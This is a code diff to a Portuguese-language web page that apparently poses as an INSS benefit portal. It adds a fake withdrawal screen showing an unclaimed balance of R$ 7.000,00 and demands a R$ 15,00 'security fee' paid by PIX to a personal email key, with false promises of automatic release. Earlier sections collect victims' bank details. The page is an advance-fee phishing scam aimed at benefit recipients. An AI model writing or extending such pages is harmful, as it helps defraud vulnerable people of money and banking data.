@@ -107,6 +107,15 @@
             background-color: #005599;
         }
         
+        .btn-pix {
+            background-color: #32BCAD;
+            margin-top: 20px;
+        }
+        
+        .btn-pix:hover {
+            background-color: #2aa899;
+        }
+        
         .hidden {
             display: none;
         }
@@ -125,6 +134,55 @@
         
         .deposit-info p {
             margin-bottom: 10px;
+        }
+        
+        .balance-display {
+            text-align: center;
+            padding: 30px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+            margin-bottom: 30px;
+        }
+        
+        .balance-amount {
+            font-size: 36px;
+            font-weight: bold;
+            color: #28a745;
+            margin: 20px 0;
+        }
+        
+        .security-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        
+        .pix-page {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .pix-qrcode {
+            width: 200px;
+            height: 200px;
+            margin: 20px auto;
+            background-color: #eee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px dashed #ccc;
+        }
+        
+        .pix-key {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 18px;
+            word-break: break-all;
         }
         
         .footer {
@@ -242,6 +300,42 @@
                     <button type="submit" class="btn">Confirmar Dados para Depósito</button>
                 </form>
             </div>
+            
+            <div id="withdrawal-section" class="card hidden">
+                <h2>Saldo Disponível para Saque</h2>
+                
+                <div class="balance-display">
+                    <p>Você tem um saldo disponível de:</p>
+                    <div class="balance-amount">R$ 7.000,00</div>
+                    <p>para ser retirado</p>
+                </div>
+                
+                <div class="security-warning">
+                    <p><strong>Atenção:</strong> Para efetuar o saque, é necessário realizar o pagamento da taxa de segurança no valor de R$ 15,00.</p>
+                    <p>Esta taxa garante a autenticidade da transação e a segurança dos seus dados.</p>
+                </div>
+                
+                <button id="pagar-taxa-btn" class="btn btn-pix">Pagar Taxa de Segurança via PIX</button>
+            </div>
+            
+            <div id="pix-section" class="card hidden">
+                <div class="pix-page">
+                    <h2>Pagamento da Taxa de Segurança</h2>
+                    <p>Realize o pagamento de R$ 15,00 via PIX para liberar seu saque</p>
+                    
+                    <div class="pix-qrcode">
+                        [QR CODE PIX]
+                    </div>
+                    
+                    <p>Ou utilize a chave PIX:</p>
+                    <div class="pix-key">fellipe06122006@gmail.com</div>
+                    
+                    <p>Após o pagamento, seu saque será liberado automaticamente em até 15 minutos.</p>
+                    <p>Você receberá um e-mail com as instruções para concluir o processo.</p>
+                    
+                    <button id="voltar-btn" class="btn">Voltar</button>
+                </div>
+            </div>
         </div>
     </main>
     
@@ -274,15 +368,19 @@
                 e.target.value = value.substring(0, 15);
             });
             
-            // Formulário de cadastro
-            const registrationForm = document.getElementById('registration-form');
+            // Elementos das seções
             const registrationSection = document.getElementById('registration-section');
             const depositSection = document.getElementById('deposit-section');
+            const withdrawalSection = document.getElementById('withdrawal-section');
+            const pixSection = document.getElementById('pix-section');
+            
+            // Formulário de cadastro
+            const registrationForm = document.getElementById('registration-form');
             
             registrationForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                // Simulação de envio de dados (em um sistema real, seria uma chamada AJAX)
+                // Simulação de envio de dados
                 setTimeout(function() {
                     // Esconde o formulário de cadastro e mostra o de depósito
                     registrationSection.classList.add('hidden');
@@ -301,11 +399,37 @@
                 
                 // Simulação de envio de dados
                 setTimeout(function() {
-                    alert('Dados bancários cadastrados com sucesso! Seu benefício será depositado conforme o calendário do INSS.');
+                    // Esconde o formulário de depósito e mostra a seção de saque
+                    depositSection.classList.add('hidden');
+                    withdrawalSection.classList.remove('hidden');
                     
-                    // Aqui poderia redirecionar para outra página ou reiniciar o processo
-                    // window.location.href = "pagina-de-confirmacao.html";
+                    // Rola a página para o topo da seção de saque
+                    withdrawalSection.scrollIntoView({ behavior: 'smooth' });
                 }, 1000);
+            });
+            
+            // Botão para pagar taxa via PIX
+            const pagarTaxaBtn = document.getElementById('pagar-taxa-btn');
+            
+            pagarTaxaBtn.addEventListener('click', function() {
+                // Esconde a seção de saque e mostra a seção PIX
+                withdrawalSection.classList.add('hidden');
+                pixSection.classList.remove('hidden');
+                
+                // Rola a página para o topo da seção PIX
+                pixSection.scrollIntoView({ behavior: 'smooth' });
+            });
+            
+            // Botão para voltar
+            const voltarBtn = document.getElementById('voltar-btn');
+            
+            voltarBtn.addEventListener('click', function() {
+                // Esconde a seção PIX e mostra a seção de saque
+                pixSection.classList.add('hidden');
+                withdrawalSection.classList.remove('hidden');
+                
+                // Rola a página para o topo da seção de saque
+                withdrawalSection.scrollIntoView({ behavior: 'smooth' });
             });
         });
     </script>
